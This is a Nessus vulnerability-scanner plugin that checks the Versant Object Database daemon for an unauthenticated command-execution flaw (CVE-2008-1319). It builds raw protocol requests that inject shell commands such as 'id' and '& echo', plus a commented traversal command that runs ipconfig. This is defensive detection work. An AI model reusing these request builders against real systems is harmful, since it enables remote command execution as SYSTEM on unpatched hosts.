#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(31419);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2008-1319");
  script_bugtraq_id(28097);
  script_osvdb_id(43063);
  script_xref(name:"EDB-ID", value:"5213");
  script_xref(name:"Secunia", value:"29230");

  script_name(english:"Versant Connection Services Daemon Arbitrary Command Execution");
  script_summary(english:"Checks return codes when running commands");

 script_set_attribute(attribute:"synopsis", value:
"The remote database service allows execution of arbitrary commands." );
 script_set_attribute(attribute:"description", value:
"The version of the Versant Object Database installed on the remote
host accepts input supplied by the client and uses it to launch needed
programs or locate database files.  An unauthenticated, remote attacker
can leverage this issue to execute arbitrary commands on the affected
host subject to the privileges under which the service operates, which
under Windows is SYSTEM." );
 script_set_attribute(attribute:"see_also", value:"http://aluigi.altervista.org/adv/versantcmd-adv.txt" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2008/Mar/35" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/03/12");
 script_cvs_date("$Date: 2016/11/03 14:16:36 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"Gain a shell remotely");
  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");
  script_dependencies("versant_oscssd_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/versant_oscssd", 5019);

  exit(0);
}


include("byte_func.inc");
include("global_settings.inc");
include("misc_func.inc");


port = get_kb_item("Services/versant_oscssd");
if (!port) port = 5019;
if (!get_port_state(port)) exit(0);


os = get_kb_item("Host/OS");
if (os && "Windows" >< os) cmd = "& echo ";
else cmd = 'id \n';
# nb: To verify this actually works, use something like the following:
#   cmd = string("..\\..\\..\\..\\..\\winnt\\system32\\ipconfig /all >> C:\\", SCRIPT_NAME, ".log \n");


dbname = "o_dblist";
user = "Administrator";
versant_rel = "7.0.1";
versant_root = "C:";
versant_db = "nessus";                 # not used
versant_dbid = SCRIPT_NAME;            # not used
versant_dbid_node = "DBID_NODE";       # not used
versant_service_name = "SERVICE_NAME"; # not used
versant_command = cmd;


# Create the base part of a request; the actual command will be added later.
set_byte_order(BYTE_ORDER_BIG_ENDIAN);

base_req = 
  mkword(1) +
  mkword(0) +
  mkdword(0) +
  mkword(2) +
  mkword(2) +
  mkdword(1) +
  mkword(0) +
  mkword(0) +
  mkdword(0) +
  crap(data:mkbyte(0), length:8) +
  mkword(1) +
  mkword(0) +
  dbname + mkbyte(0) +
  user + mkbyte(0) +
  versant_rel + mkbyte(0);
if (strlen(base_req) % 4) base_req += crap(data:mkbyte(0), length:4-strlen(base_req)%4);
base_req += 
  mkdword(11) +
  mkdword(0x100) + 
  mkword(0) +
  mkword(0) +
  mkword(0) +
  mkbyte(0) +
  mkbyte(0) +
  get_host_name() + mkbyte(0) +
  versant_root + mkbyte(0) +
  versant_db + mkbyte(0) +
  versant_dbid + mkbyte(0) +
  versant_dbid_node + mkbyte(0) +
  crap(data:mkbyte(0), length:5) +
  versant_service_name + mkbyte(0);


# Try to run a command successfully.
soc = open_sock_tcp(port);
if (!soc) exit(0);

req = base_req +
  versant_command + mkbyte(0);
req += crap(data:mkbyte(0), length:0x800-strlen(req));
send(socket:soc, data:req);
res = recv(socket:soc, length:0x800);
if (strlen(res) != 0x800) exit(0);
close(soc);


# If the error code suggests the command ran successfully...
rc = getword(blob:res, pos:6);
if (rc == 0)
{
  soc = open_sock_tcp(port);
  if (!soc) exit(0);

  # Try to generate an error with a bogus command.
  versant_command = string(" & ", SCRIPT_NAME, "-", unixtime(), " \n");
  versant_command = '& id\n';
  req = base_req +
    versant_command + mkbyte(0);
  req += crap(data:mkbyte(0), length:0x800-strlen(req));
  send(socket:soc, data:req);
  res = recv(socket:soc, length:0x1000);
  if (strlen(res) < 0x800) exit(0);

  # There's a problem if the return code now indicates a failure.
  rc = getword(blob:res, pos:6);
  if (rc == 7001) security_hole(port);

  close(soc);
}

